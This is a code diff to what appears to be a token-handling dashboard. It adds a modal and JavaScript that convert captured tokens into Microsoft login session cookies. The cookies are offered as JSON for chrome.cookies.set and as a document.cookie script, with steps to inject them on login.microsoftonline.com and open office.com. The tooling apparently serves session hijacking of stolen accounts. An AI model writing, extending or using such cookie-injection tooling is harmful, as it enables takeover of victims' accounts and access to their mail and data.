@@ -327,6 +327,59 @@
             </div>
         </div>
 
+        <!-- Cookie Conversion Result Modal -->
+        <div id="cookieModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:10000;align-items:center;justify-content:center;">
+            <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:24px;max-width:750px;width:90%;max-height:85vh;overflow-y:auto;">
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
+                    <h2 style="font-family:var(--font-heading);font-size:16px;color:var(--accent);margin:0;">
+                        <i class="fas fa-cookie"></i> Converted Cookies
+                    </h2>
+                    <button onclick="closeCookieModal()" style="background:none;border:none;color:var(--text);font-size:20px;cursor:pointer;">&times;</button>
+                </div>
+
+                <div id="cookieModalInfo" style="margin-bottom:16px;padding:12px;background:rgba(0,255,204,0.1);border:1px solid rgba(0,255,204,0.3);border-radius:4px;font-size:13px;"></div>
+
+                <div style="margin-bottom:14px;">
+                    <label style="display:block;font-size:12px;color:var(--text);margin-bottom:6px;font-weight:600;">
+                        <i class="fas fa-list"></i> Readable Format (for inspection)
+                    </label>
+                    <textarea id="cookieReadable" style="width:100%;height:140px;background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:8px;font-family:monospace;font-size:11px;color:var(--text);resize:vertical;" readonly></textarea>
+                    <button onclick="copyCookieText('cookieReadable')" class="btn-accent-sm" style="margin-top:6px;">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+
+                <div style="margin-bottom:14px;">
+                    <label style="display:block;font-size:12px;color:var(--text);margin-bottom:6px;font-weight:600;">
+                        <i class="fas fa-code"></i> JSON Format (for Chrome extension / chrome.cookies.set)
+                    </label>
+                    <textarea id="cookieJson" style="width:100%;height:140px;background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:8px;font-family:monospace;font-size:11px;color:var(--text);resize:vertical;" readonly></textarea>
+                    <button onclick="copyCookieText('cookieJson')" class="btn-accent-sm" style="margin-top:6px;">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+
+                <div style="margin-bottom:14px;">
+                    <label style="display:block;font-size:12px;color:var(--text);margin-bottom:6px;font-weight:600;">
+                        <i class="fas fa-bookmark"></i> Bookmarklet Script (paste in console on login.microsoftonline.com)
+                    </label>
+                    <textarea id="cookieScript" style="width:100%;height:140px;background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:8px;font-family:monospace;font-size:11px;color:var(--text);resize:vertical;" readonly></textarea>
+                    <button onclick="copyCookieText('cookieScript')" class="btn-accent-sm" style="margin-top:6px;">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+
+                <div style="padding:12px;background:rgba(255,200,0,0.1);border:1px solid rgba(255,200,0,0.3);border-radius:4px;font-size:12px;color:var(--text);line-height:1.5;">
+                    <b>Instructions:</b>
+                    <ol style="margin:6px 0 0 18px;padding:0;">
+                        <li>Use the <b>Extension</b> button for automatic cookie injection</li>
+                        <li>Or paste the <b>Bookmarklet Script</b> in the browser console on <code>login.microsoftonline.com</code></li>
+                        <li>Or use the <b>JSON Format</b> with chrome.cookies.set() in a custom extension</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+
         <div class="card" style="overflow:hidden;">
             <table class="tokens-table">
                 <thead>
@@ -730,11 +783,83 @@
                     }
                 );
 
-                showToast(data.message || 'Conversion complete');
-                loadTokens();
+                if (data.success && data.cookies) {
+                    openCookieModal(data);
+                } else {
+                    showToast(data.message || 'Conversion complete');
+                    loadTokens();
+                }
             } catch (e) {
                 showToast('Conversion failed: ' + e.message, true);
             }
+        }
+
+        function openCookieModal(data) {
+            document.getElementById('cookieModal').style.display = 'flex';
+
+            // Info banner
+            document.getElementById('cookieModalInfo').innerHTML =
+                '<i class="fas fa-check-circle" style="color:#00ffcc;"></i> <b>' + data.cookie_count + ' cookies generated</b> — ' +
+                'Target: <code>' + (data.target_url || 'https://www.office.com/') + '</code>';
+
+            const cookies = data.cookies;
+
+            // Readable format
+            if (Array.isArray(cookies)) {
+                document.getElementById('cookieReadable').value = cookies.map(c =>
+                    [c.name + '=' + c.value,
+                     'Domain=' + (c.domain || '.microsoftonline.com'),
+                     'Path=' + (c.path || '/'),
+                     c.secure ? 'Secure' : '',
+                     c.httpOnly ? 'HttpOnly' : '',
+                     c.sameSite ? 'SameSite=' + c.sameSite : ''].filter(Boolean).join('; ')
+                ).join('\n');
+            } else {
+                document.getElementById('cookieReadable').value = cookies;
+            }
+
+            // JSON format (for chrome.cookies.set)
+            document.getElementById('cookieJson').value = JSON.stringify(cookies, null, 2);
+
+            // Bookmarklet / console script
+            if (Array.isArray(cookies)) {
+                document.getElementById('cookieScript').value = cookies.map(c => {
+                    let cmd = 'document.cookie="' + c.name + '=' + encodeURIComponent(c.value);
+                    if (c.path) cmd += ';path=' + c.path;
+                    if (c.secure !== false) cmd += ';secure';
+                    if (c.sameSite) cmd += ';samesite=' + c.sameSite.toLowerCase();
+                    cmd += '";';
+                    return cmd;
+                }).join('\n') + '\nconsole.log("Cookies set. Refresh the page.");';
+            } else {
+                document.getElementById('cookieScript').value = '';
+            }
+
+            showToast('Cookies generated — click copy to use them');
+        }
+
+        function closeCookieModal() {
+            document.getElementById('cookieModal').style.display = 'none';
+        }
+
+        function copyCookieText(elementId) {
+            const text = document.getElementById(elementId).value;
+            if (!text) {
+                showToast('Nothing to copy', true);
+                return;
+            }
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('Copied to clipboard');
+            }).catch(() => {
+                // Fallback for older browsers
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                document.body.removeChild(ta);
+                showToast('Copied to clipboard');
+            });
         }
 
         // Import Token
